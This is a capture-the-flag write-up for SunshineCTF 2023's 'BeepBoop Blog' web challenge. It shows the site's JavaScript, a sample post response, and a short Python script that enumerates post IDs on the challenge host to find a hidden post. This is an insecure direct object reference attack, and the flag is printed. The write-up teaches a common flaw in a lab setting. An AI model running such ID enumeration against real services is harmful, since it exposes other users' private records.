# SunshineCTF 2023

## BeepBoop Blog

> A few robots got together and started a blog! It's full of posts that make absolutely no sense, but a little birdie told me that one of them left a secret in their drafts. Can you find it?
> 
>  Author: N/A

Tags: _web_

## Solution
For this challenge we get a small web service. The page shows a list of posts from different `robots`. We also can view the whole content of the post. If we inspect the code we find a endpoint that is used to load posts (`/posts`). If we insert a post id (`/posts/{id}`) we get the full post details.

```js
function loadPosts() {
    fetch("/posts").then(data => {
        return data.json();
    }).then(json => {
        document.getElementById("contents").innerHTML = "";

        let out = "";
        for (let i = 0; i < json.posts.length; i++) {
            let post = json.posts[i].post;
            let preview = post.substring(0, 100) + "...";
            let post_url = json.posts[i]["post_url"].split("/");
            let post_id = post_url[post_url.length - 1];

            const postElement = document.createElement("div");
            postElement.classNames = "post";

            const headElement = document.createElement("h3");
            headElement.innerText = `Post from ${json.posts[i].user}`;
            postElement.appendChild(headElement);

            const textElement = document.createElement("p");
            textElement.innerText = preview;
            postElement.appendChild(textElement);

            const linkElement = document.createElement("a");
            linkElement.onclick = evt => { loadPost(post_id) };
            linkElement.href = "#";
            linkElement.innerText = "View All...";
            postElement.appendChild(linkElement);

            document.getElementById("contents").appendChild(postElement);
        }
    })
}

function loadPost(post_id) {
    document.getElementById("contents").innerHTML = "";

    fetch(`/post/${post_id}/`).then(data => {
        return data.json();
    }).then(json => {;

        const postElement = document.createElement("div");
        postElement.classNames = "post";

        const headElement = document.createElement("h3");
        headElement.innerText = `Post from ${json.user}`;
        postElement.appendChild(headElement);

        const textElement = document.createElement("p");
        textElement.innerText = json.post;
        postElement.appendChild(textElement);

        const linkElement = document.createElement("a");
        linkElement.onclick = evt => { loadPosts() };
        linkElement.href = "#";
        linkElement.innerText = "Go Back";
        postElement.appendChild(linkElement);

        document.getElementById("contents").appendChild(postElement);
    })
}

window.onload = evt => {
    loadPosts();
}
```

If we call, for instance `/post/10/` we get 

```json
{"hidden":false,"post":"Were 1.17 verb trafficare and noun traffico. the origin of gambling in some. Ad, moche usually freshwater.. Accredited sanctuaries stage, in 1786, a tragedy. 28.9%. (its now predominately black or dark nebulae, which concentrate and collapse (in. Kinetics, electrochemistry, 12\u00bc inches) used by residents: \n the tariffs for water supply and. Christian access ancient egyptians, and the theory of chemical. And islets relations professionals conduct their jobs. they. Ridge mountains arboreal birds. the combined works of ivan albright and ed paschke.. Also planned germany have. Has layers kiefer, j\u00f6rg immendorff, a. r. penck, markus l\u00fcpertz, peter robert keil and. Are comparably another conveyor that delivers it to ourselves to treat disease and. Of confederation are cooperating to solve include how to cope with. Eyes. unlike score) or improvised for each \u00e9tage varies. 1,900 fathoms are 73 additional schools in the nation. montana. Bank robberies. bekenstein-hawking radiation, but which are held together.","user":"Robot #911"}
```

There's a interesting field `hidden`, so maybe tehre are hidden posts we can query like this? From trial and error we find that there are `1024` posts in total. So lets just fetch all the posts and see if there is a hidden flag somewhere.

```python
import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

f = open("test.txt", "w")

for i in range(0, 1024):
    print(i, f"foo{i}")
    res = requests.get(f"https://beepboop.web.2023.sunshinectf.games/post/{i}", verify=False)
    if res.status_code == 200:
        f.write(f"{res.text}\n\n")
        x = json.loads(res.text)
        if x["hidden"] == True:
            print(x)
            break

f.close()
```

And yes, at some point we find a hidden post containing the flag.

Flag `sun{wh00ps_4ll_IDOR}`